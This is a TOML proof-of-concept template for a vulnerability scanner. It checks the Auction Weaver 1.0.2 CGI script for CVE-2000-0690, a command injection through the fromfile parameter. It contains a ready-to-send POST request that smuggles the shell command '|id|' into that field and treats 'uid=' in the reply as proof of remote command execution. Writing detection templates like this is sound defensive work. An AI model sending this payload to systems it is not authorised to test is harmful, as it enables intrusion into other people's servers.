[info]
author = "AVE"
description = "检测目标 Auction Weaver 1.0.2 CGI 脚本是否存在 fromfile 参数命令注入漏洞，通过 POST 请求向 /cgi-bin/awl/auctionweaver.pl 发送包含 shell 元字符的 payload，验证远程命令执行"
id = "POC-AVE-2000-0541"
name = "CVE-2000-0690 PoC"
severity = "critical"
tags = ["cve-2000-0690"]
vuln_id = [
    "CVE-2000-0690",
    "AVE-2000-0541",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/awl/auctionweaver.pl"
protocol = "http"

[poc.requests.body]
content = "flag1=1&fromfile=%7Cid%7C&placebid=1&catdir=cat1&username=test&password=test&bid=1&nobiditem=1&sbutton=BID"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
